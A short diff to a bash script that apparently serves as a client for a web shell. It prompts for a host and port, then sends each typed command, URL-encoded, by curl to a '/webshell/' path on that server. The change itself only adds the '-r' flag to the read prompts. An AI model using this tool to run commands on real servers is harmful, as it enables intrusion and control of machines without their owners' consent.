@@ -1,10 +1,10 @@
 #!/bin/bash
 
-read -p 'Host: ' host
-read -p 'Port: ' port
+read -rp 'Host: ' host
+read -rp 'Port: ' port
 
 while true; do
-  read -p '$ ' raw_command
+  read -rp '$ ' raw_command
   command=$(printf %s "${raw_command}" | jq -sRr @uri)
 
   response=$(curl -s -w "%{http_code}" -o /dev/null "http://${host}:${port}/webshell/${command}")
